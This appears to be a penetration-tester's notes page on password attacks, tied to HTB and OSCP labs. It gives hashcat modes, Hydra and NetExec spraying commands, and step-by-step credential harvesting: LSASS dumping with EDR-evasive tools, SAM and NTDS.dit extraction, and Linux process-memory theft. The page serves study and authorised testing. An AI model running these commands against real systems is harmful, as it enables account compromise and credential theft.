+++
title = 'Password Attacks'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['utilities', 'payloads', 'password-attacks', 'hashcat']
+++

Password attacks fail for three reasons: attacking the wrong hash type, locking out accounts by spraying carelessly, or missing credentials that are already on the box. This file is organised to avoid all three — **identify the hash first, spray safely, and harvest what is already there before cracking anything.**

---

## 0. Triage — Read This Before Cracking

Most wasted time in password attacks comes from running `hashcat` against an unrecognised hash. Run these three steps first.

### 0.1 Identify the hash

```bash
hashid hash.txt
hashcat --identify hash.txt
# or paste into https://hashes.com/en/identify
```

If the identifier is ambiguous, check the **prefix**:

| Prefix | Type | Hashcat mode |
|---|---|---|
| `$1$` | md5crypt | `500` |
| `$2a$` / `$2b$` / `$2y$` | bcrypt | `3200` |
| `$5$` | sha256crypt | `7400` |
| `$6$` | sha512crypt | `1800` |
| `$krb5tgs$` | Kerberoast TGS | `13100` |
| `$krb5asrep$` | AS-REP roast | `18200` |
| `$NT$` / 32 hex | NTLM | `1000` |
| `$2$` / `$argon2` | Argon2 | `34000` (Hashcat v7.0.0+) |

### 0.2 Check online databases first

Never run a GPU crack against a hash that is already in a public rainbow table.

1. [CrackStation](https://crackstation.net/)
2. [Hashes.com](https://hashes.com/en/decrypt/hash)
3. [Cmd5](https://www.cmd5.org/)
4. [MD5Decrypt](https://md5decrypt.net/)

### 0.3 Check default credentials

Before any cracking, try the service's default credentials:

- [SecLists default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [CIRT.net passwords](https://www.cirt.net/passwords)
- [Datarecovery default passwords](https://datarecovery.com/rd/default-passwords/)
- Google: `<service> default credentials`

---

## 1. Making Custom Wordlists

```bash
# Interactive password wordlist (cupp)
cupp -i

# Username wordlist from a name
./username-anarchy Bill Gates > wordlist.txt

# Filter: remove passwords shorter than 8 characters
sed -ri '/^.{,7}$/d' wordlist.txt

# Filter: remove passwords without numbers
sed -ri '/[0-9]+/!d' wordlist.txt

# Scrape a website for keywords (cewl)
cewl https://target.example -d 4 -m 6 --lowercase -w wordlist.txt
```

### Wordlist mutations and rules

A **mutation** adds characters, digits, or leet substitutions to a base wordlist. The single highest-value rule file is **OneRuleToRuleThemAll.rule** (~52,000 rules covering special characters, numbers, and common substitutions).

```bash
# Apply a rule file and deduplicate
hashcat --force password.list -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --stdout \
  | sort -u > mutated.list
```

**wordlistxpl** (2026) automates rule application, conversion between Hashcat and John dialects, and rule optimisation:

```bash
pip install wordlistxpl

# Apply Hashcat rules
python wlf.py rules apply --wordlist base.txt --rules best64.rule -o out.lst

# Convert Hashcat rules to John format
python wlf.py rules convert --rules hc.rule --to john -o jtr.rule

# Optimise a messy rule file
python wlf.py rules optimize --rules messy.rule -o clean.rule
```

> **`OneRuleToRuleThemStill`** is a newer, slightly improved variant of ORTRTA. Both are worth having; ORTRTA is the established default.

---

## 2. Offline Password Cracking

### 2.1 Hashcat

Basic usage:

```bash
hashcat -m MODE hashfile /path/to/wordlist
```

Common modes:

| Hash | Mode | Notes |
|---|---|---|
| NTLM | `1000` | **Pass-the-Hash usable** |
| NetNTLMv2 | `5600` | **Crack-only — cannot be used for PtH** |
| NetNTLMv1 | `5500` | |
| LM | `3000` | |
| Kerberoast TGS | `13100` | |
| AS-REP roast | `18200` | |
| md5crypt (`$1$`) | `500` | |
| bcrypt (`$2a$`/`$2y$`) | `3200` | Use `--user`; force the mode |
| sha256crypt (`$5$`) | `7400` | |
| sha512crypt (`$6$`) | `1800` | |
| Raw MD5 (32 hex) | `0` | **Not** `500` |
| KeePass (KDBX v4) | `13400` | Use current `keepass2john` |
| BitLocker | `22100` | |
| Argon2 | `34000` | Hashcat v7.0.0+ |

> **Hashcat v7.0.0 (2025)** added 58 new hash types, including **Argon2** (`34000`), **KeePass KDBX v4**, **LUKS2 (Argon2i)**, MetaMask wallets, and SNMPv3. **v7.1.0** added `AS/400`, `BLAKE2b`, `MD6`, and `sha224` variants. Update before cracking modern formats.

### 2.2 John the Ripper

```bash
# Basic
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile

# Show results
john hashfile --show

# Specify format
john --format=NT hash.txt
john --format=netntlmv2 hash.txt
john --format=krb5tgs hash.txt
john --format=raw-md5 hash.txt
john --format=sha512crypt hash.txt

# Unshadow
unshadow /etc/passwd /etc/shadow > unshadowed.hashes
```

### 2.3 `*2john` file extraction

```bash
sudo apt install john-data
# or build John Jumbo from source for the latest scripts

rar2john file.rar > hash
zip2john file.zip > hash
ssh2john id_rsa > hash
pdf2john file.pdf > hash
office2john file.docx > hash
keepass2john database.kdbx > hash

john --wordlist=wordlist.txt hash
```

> **Edge case:** `john-data` on Kali ships only the `*2john` scripts — install the `john` binary separately, or build **John Jumbo** for Argon2 and KDBX v4 support.

### 2.4 Quinto — automated cracking orchestration (2026)

**Quinto** identifies the hash type, selects an attack plan based on hash speed and your `--patience` level, and runs Hashcat → John in sequence (wordlist → rules → masks → passphrases), saving session state for `--resume`.

```bash
pip install quinto

quinto 'HASH_STRING'
quinto hash.txt --patience high
quinto file.zip          # extracts hash with *2john, then cracks
```

It is useful for CTF-style work and for not hand-tuning attack modes on a new hash type.

---

## 3. Bruteforcing Services — Hydra and NetExec

### 3.1 Hydra

```bash
# Basic
hydra -L user.list -P password.list service://ip

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt -u -f IP -s PORT http-get /

# HTTP POST form (error string)
hydra -l username -P passwords.txt -f IP -s PORT http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP POST form (failure element)
hydra -l username -P passwords.txt -f IP -s PORT http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

# SSH
hydra -L usernames.txt -P passwords.txt -u -f ssh://IP:PORT -t 4

# FTP
hydra -l username -P passwords.txt ftp://IP
```

### 3.2 NetExec (formerly CrackMapExec)

```bash
# WinRM
nxc winrm <ip> -u userlist -p passwordlist

# SMB
nxc smb <ip> -u userlist -p passwordlist --continue-on-success

# Enumerate lockout policy FIRST
nxc smb <dc> --pass-pol
```

> **Warning — spray, do not brute force.** `hydra -P passwords.txt` and `nxc -p passwords.txt` try **every user × every password** and will lock out domain accounts (common policy: 3–5 attempts). Spray **one password across all users**, then wait.

### 3.3 Safe spraying tools

**DonPwner** (built on DonPAPI results) sprays with **delay and jitter**, auto-removes successfully authenticated users from later rounds, and controls the target directly:

```bash
pipx install nxc
pip install -r requirements.txt
pipx install git+https://github.com/login-securite/DonPAPI.git

# Generate targeted wordlists from DonPAPI output
python3 donpwner.py extract

# Safe spray: 30-minute delay, 20% jitter
python3 donpwner.py attack --target dc01.domain.com --delay 30 --jitter 20

# Custom lists
python3 donpwner.py attack --target 192.168.1.0/24 \
  --user-file users.txt --pass-file passwords.txt --delay 45 --jitter 15
```

**nxcspray** is a shell wrapper that respects the **reset counter and lockout threshold** from `nxc --pass-pol`:

```bash
bash ./nxcspray.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt \
  -a 5 -i 30 -d test.local -n 445
# -a: passwords per cycle
# -i: delay between cycles (minutes)
```

**TREVORspray** is a modular threaded sprayer with proxying and loot modules, useful for cloud/AD hybrid environments.

---

## 4. Hunting Passwords on Windows

### 4.1 Find files containing “password”

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

**snaffler-ng** (2026) is the modern replacement for manual share-walking — it discovers readable SMB shares, walks directory trees, and identifies credentials and sensitive data:

```bash
pip install snaffler-ng

snaffler -u USER -p PASS -d DOMAIN.LOCAL
snaffler -u USER -p PASS --unc //10.0.0.5/Share
snaffler --local-fs /mnt/share
nxc smb 10.0.0.0/24 -u user -p pass --shares | snaffler -u user -p pass --stdin
```

### 4.2 LSASS dumping

**Classic:**

```cmd
tasklist /svc | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump LSASS-PID C:\lsass.dmp full
```

**Nanodump** (2025) is the stealthy replacement — syscall-based, fork-based, and avoids common EDR signatures:

```cmd
nanodump.x64.exe --write C:\Windows\Temp\doc.docx --valid
```

**lsassy** dumps LSASS remotely over SMB and parses credentials in one command:

```bash
lsassy -d DOMAIN -u USER -p PASS TARGET
# or as a NetExec module:
nxc smb TARGET -u USER -p PASS -M lsassy
nxc smb TARGET -u USER -p PASS -M nanodump
```

**Parse any dump** with pypykatz:

```bash
pypykatz lsa minidump lsass.dmp
```

> **Windows 11 24H2/25H2/26H1 and Server 2025:** **KvcForensic** is a dependency-free LSA extractor targeting these versions, parsing MSV, WDigest, Kerberos, CredMan, and DPAPI.

### 4.3 SAM / SECURITY / SYSTEM hives

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save
```

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

### 4.4 NTDS.dit

**Fast — with valid credentials:**

```bash
nxc smb targetIP -u validuser -p password --ntds
```

**secretsdump-ng** (2026) extracts NTDS.dit and registry hives **using any command-execution port**, not just 445, via DSInternals over PowerShell:

```bash
pip install secretsdump-ng

secretsdump-ng 192.168.1.10 username password
secretsdump-ng 192.168.1.10-20 username password --threads 20
secretsdump-ng 192.168.1.10 username password --just-dc-user administrator
secretsdump-ng 192.168.1.10 username password --skip-portscan
```

**Manual — volume shadow copy:**

```cmd
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

---

## 5. Hunting Passwords on Linux

### 5.1 Files and configuration

```bash
# Config files
for l in .conf .config .cnf; do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -vE "lib|fonts|share|core"
done

# Database files
for l in .sql .db .*db .db*; do
  echo -e "\nDB File extension: $l"
  find / -name "*$l" 2>/dev/null | grep -vE "doc|lib|headers|share|man"
done

# Scripts
for l in .py .pyc .pl .go .jar .c .sh; do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -vE "doc|lib|headers|share"
done

# Documents
for ext in .xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*; do
  echo -e "\nFile extension: $ext"
  find / -name "*$ext" 2>/dev/null | grep -vE "lib|fonts|share|core"
done

# Crontab
cat /etc/crontab

# SSH private keys
grep -rnw "PRIVATE KEY" / 2>/dev/null | grep ":1"
```

### 5.2 Process memory — `/proc/*/mem`

On Linux, credentials live in **process memory**: `sshd`, `sudo`, `su`, `gnome-keyring`, `kwallet`, and browsers. This technique (MITRE **T1003.007**) reads `/proc/<PID>/maps` to find memory regions and `/proc/<PID>/mem` to read them — **no ptrace required**.

**MimiPenguin** — the Linux equivalent of Mimikatz, targeting `sshd` and `gnome-keyring`:

```bash
./mimipenguin.sh          # requires root or same UID as target process
```

**LaZagne** — cross-platform credential enumeration, including browsers:

```bash
python3 laZagne.py all
python3 laZagne.py browsers
```

**PACEMAKER** — the credential stealer used by **APT5** since 2020, targeting Linux and network devices. It reads `/proc` memory directly and is **more evasive** than MimiPenguin or LaZagne; detection rules specifically look for its binary name and `/proc/<PID>/mem` access patterns.

### 5.3 VaultRip — unified Linux credential harvesting (2026)

**VaultRip** sweeps six surfaces in one command: filesystem credential paths, process memory (`/proc/*/mem`), browser credential databases, system keyrings (GNOME/kwallet), Kerberos ccache/keytab, and offline dumps (LSASS/SAM/NTDS.dit). It also has opt-in active modules (DCSync, Pass-the-Hash, Pass-the-Ticket, golden/silver ticket).

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install vaultrip
pip install vaultrip[impacket]    # offline LSASS/SAM/NTDS parsing
pip install vaultrip[attack]      # DCSync, PTH, ticket forging

vaultrip ~                         # sweep the filesystem and memory
vaultrip --remote HOST             # SSH remote harvesting, no files dropped
vaultrip --dump lsass.dmp          # offline dump parsing
```

It replaces the fragmented “run `find`, then grep memory, then use another tool for Kerberos” workflow with a single command.

---

## 6. Field Notes from the HTB List

- **Force the bcrypt mode.** `$2a$`/`$2y$` → `hashcat -m 3200 --user`; autodetection can pick the wrong bcrypt variant (Codify, Devvortex, Builder, Cctv).
- **`$5$` sha256crypt → `-m 7400`** (Sunday). **NetNTLMv2 → `-m 5600` is crack-only** — it cannot be used for pass-the-hash.
- **KDBX4 needs a current `keepass2john`**; older versions report `File version 40000` and fail (Puppy). Use Hashcat `-m 13400` with the current script.
- **Cisco `password 7` is reversible**, not a hash (Heist); `enable secret 5` is md5crypt (`-m 500`).
- **GPP `cpassword` is offline decryption** with a public AES key — use `gpp-decrypt`, not hashcat (Active).
- **Spray one password per pass**, check `--pass-pol`, and use `--continue-on-success`; `nxc`/CME stops at the first success by default (Heist). Use **DonPwner** or **nxcspray** to respect the lockout threshold.

Full context: [HTB Windows machines](/notes/oscp-labs/windows/), [Linux](/notes/oscp-labs/linux/).

---

## Quick Reference — New Tools Added

| Tool | What it replaces / adds | Install |
|---|---|---|
| **Quinto** | Automated Hashcat/John orchestration and attack planning | `pip install quinto` |
| **wordlistxpl** | Rule application, Hashcat ↔ John conversion, rule optimisation | `pip install wordlistxpl` |
| **DonPwner** | Safe spraying with delay + jitter, based on DonPAPI | `pipx install nxc` + DonPAPI |
| **nxcspray** | Spraying that respects the AD lockout policy | GitHub: `Lins3t/nxcspray` |
| **VaultRip** | Unified Linux credential harvesting (6 surfaces) | `pip install vaultrip` |
| **secretsdump-ng** | NTDS.dit extraction over any execution port | `pip install secretsdump-ng` |
| **snaffler-ng** | SMB share credential hunting (Python port) | `pip install snaffler-ng` |
| **Nanodump** | Stealthy LSASS dumping (syscall/fork-based) | GitHub: `fortra/nanodump` |
| **lsassy** | Remote LSASS dump + parse in one command | `pip install lsassy` |
| **KvcForensic** | LSA extraction for Win11 24H2+/Server 2025 | GitHub: `wesmar/KvcForensic` |
| **PACEMAKER** | APT5 credential stealer (Linux `/proc` memory) | Reference in MITRE S1109 |
